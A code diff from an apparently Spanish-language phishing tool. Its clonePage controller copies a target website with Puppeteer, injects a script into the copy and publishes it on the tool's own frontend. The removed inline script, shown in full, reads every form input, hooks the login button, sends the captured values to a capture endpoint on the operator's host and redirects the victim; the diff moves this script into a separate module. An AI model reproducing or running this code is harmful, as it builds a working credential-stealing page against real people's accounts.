@@ -5,11 +5,27 @@ import { exec } from 'child_process'; // PRUEBA
 import { HOST } from '../config/configEnv.js';
 import { AppDataSource } from '../config/configDb.js';
 import CampaignSchema from '../entity/campaign.entity.js';
+import { urlValidation } from '../validations/email.validation.js';
+import { injectedScriptContent } from '../utils/injectedScriptContent.js';
+import {
+    handleErrorClient,
+} from "../handlers/responseHandlers.js";
 
 export const clonePage = async (req, res) => {
     try {
-        const { name, url } = req.body;
+
+        const { body } = req;
+
+        const { name, url } = body;
+
         if (!name || !url) return res.status(400).json({ message: 'name y url requeridos' });
+
+        const { error } = urlValidation.validate(body);
+        
+        if (error) {
+            console.error(error)
+            return handleErrorClient(res, 400, "Error al validar URL", error.message);
+        }
 
         const campaignRepository = AppDataSource.getRepository(CampaignSchema.options.name);
 
@@ -22,13 +38,16 @@ export const clonePage = async (req, res) => {
         console.log(`Campaña '${name}' guardada en la DB con ID: ${newCampaign.id}`);
 
         const browser = await puppeteer.launch({
-		args: ['--no-sandbox', '--disable-setid-sandbox']
-	});
+		    args: ['--no-sandbox', '--disable-setid-sandbox']
+	    });
+
         const page = await browser.newPage();
 
         await page.goto(url, { waitUntil: 'networkidle2' });
 
-        await page.evaluate(() => {
+        const scriptToInject = injectedScriptContent(HOST);
+
+        await page.evaluate((scriptContent) => {
             const toAbsolute = (u) => new URL(u, location.href).href;
 
             document.querySelectorAll('link[href]').forEach((el) => {
@@ -52,48 +71,13 @@ export const clonePage = async (req, res) => {
             });
 
             const script = document.createElement('script');
-            script.innerHTML = `
-                function getCredenciales() {
-                const inputs = document.querySelectorAll('input');
-                const data = {};
-                inputs.forEach(input => {
-                    data[input.name || input.id || input.type] = input.value;
-                });
-                return data;
-                }
-
-                function enviarCredenciales() {
-                    const data = getCredenciales();
-                    fetch('http://${HOST}:1606/api/capture/capture', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(data)
-                    }).catch(err => console.error('Error enviando credenciales:', err));
-                }
-
-                // Intenta enganchar el primer botón que diga "Iniciar sesión" o similar
-                const posibleBoton = Array.from(document.querySelectorAll('button, input[type="submit"], input[type="button"]'))
-                .find(btn => {
-                    const texto = (btn.innerText || btn.value || '').toLowerCase();
-                    return texto.includes('iniciar') || texto.includes('ingresar') || texto.includes('entrar') || texto.includes('login');
-                });
-                if (posibleBoton) {
-                posibleBoton.addEventListener('click', () => {
-                    enviarCredenciales();
-                    setTimeout(() => {
-                    window.location.href = '/gracias.html';
-                    }, 1000);
-                });
-                }
-            `;
+            script.innerHTML = scriptContent;
             document.body.appendChild(script);
-        });
-
-
+        }, scriptToInject);
 
         const html = await page.content();
 
-        const folderPath = path.resolve(`../../frontend/public/${name}`);
+        const folderPath = path.resolve(`../frontend/public/${name}`);
         fs.mkdirSync(folderPath, { recursive: true });
         fs.writeFileSync(`${folderPath}/index.html`, html);
 
@@ -104,8 +88,6 @@ export const clonePage = async (req, res) => {
 	exec('pm2 restart 1', (error, stdout, stderr) => {
             if (error) {
                 console.error(`Error al reiniciar frontend: ${error.message}`);
-                // Puedes decidir qué hacer aquí: si es un error crítico o solo un log.
-                // No debería impedir que la respuesta al usuario se envíe.
             }
             if (stderr) {
                 console.error(`Stderr al reiniciar frontend: ${stderr}`);
